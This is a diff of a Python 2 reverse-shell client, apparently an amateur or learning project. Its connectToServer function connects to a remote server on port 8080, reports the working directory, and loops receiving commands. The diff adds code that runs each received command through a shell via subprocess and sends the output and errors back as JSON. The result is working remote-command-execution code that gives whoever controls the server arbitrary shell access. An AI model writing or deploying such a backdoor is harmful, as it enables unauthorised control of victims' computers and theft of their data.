@@ -21,18 +21,22 @@ def connectToServer():
 	port = 8080                # Port of server
 	s.connect((host, port))
 
-	# Send current working directory to server
+	# Initially, send current working directory to server
 	currentDir = os.getcwd()
 	print "Sending working directory: {}".format(currentDir)
 	s.sendall(currentDir)
 
-	while True: # Keep  listening for instructions
-		data = s.recv(1024)
-		print "raw cmd from server is: {}".format(data)
+	# Keep  listening for instructions
+	while True: 
+		print "Waiting for command..."
+		data = s.recv(1024)	# Receive command from server
+		print "\n\nraw cmd from server is: {}".format(data)
+		data = json.loads(data)
+		print "formatted cmd form server is: {}".format(data)
 
 		# Extract commands into separate words
 		commandsWords = data.split()
-		#print "commandsWords is: {}".format(commandsWords) 
+		print "commandsWords is: {}".format(commandsWords) 
 
 		# Other data to send back to client
 		exception = ""
@@ -52,38 +56,40 @@ def connectToServer():
 				print "Exception is: {}".format(e)
 				exception = e
 
-			# Send back current directory
-			newDir = os.getcwd()
-			print "New working directory: {}".format(newDir)
-
-			# Formatting data to send to client
-			sendBack = {}
-			sendBack["currentDir"] = newDir
-			sendBack["exception"] = str(exception)
-			sendBack["commandOutput"] = str(commandOutput)
-			print "sendBack is: {}".format(sendBack)
-			print "sendBacks exception is: {}".format(sendBack["exception"])
-			print "sendBacks commandOutput is: {}".format(sendBack["commandOutput"])
-			
-			sendBack = json.dumps(sendBack) #data serialized
-			s.sendall(sendBack)
-
 		# Other commands
 		else:
 			try:
-				#process = os.popen(data)
-				#results = str(process.read()) 
-				#print "results of command is: \n{}".format(results)
+				print "\nother commands\n"
+				# process = os.popen(data)
+				# results = str(process.read()) 
+				# print "results of command is: \n{}".format(results)
+				# commandOutput = results
 
-				process2 = os.system(data)
-				#results = str(process2.read()) 
-				#print "results of command is: \n{}".format(results)
+				# Pipes any output to standard stream				
+				cmd = subprocess.Popen(data, shell = True, stdout=subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
+				commandOutput = cmd.stdout.read() + cmd.stderr.read()
+				print "commandOutput is: \n{}".format(commandOutput)
 
-				# First send back current directory
-				newDir = os.getcwd()
-				print "New working directory: {}".format(newDir)			
 			except Exception as e:
 				print "exception is: {}".format(e)
+				exception = e
+
+		# Get new current directory regardless of changed or not
+		newDir = os.getcwd()
+		print "New working directory: {}".format(newDir)
+		
+		# Formatting data to send to client
+		sendBack = {}
+		sendBack["currentDir"] = newDir
+		sendBack["exception"] = str(exception)
+		sendBack["commandOutput"] = str(commandOutput)
+		# print "sendBack is: {}".format(sendBack)
+		# print "sendBacks exception is: {}".format(sendBack["exception"])
+		# print "sendBacks commandOutput is: {}".format(sendBack["commandOutput"])
+		
+		sendBackFormatted = json.dumps(sendBack) #data serialized
+		s.sendall(sendBackFormatted)
+
 		
 	s.close # Close the socket when done
 
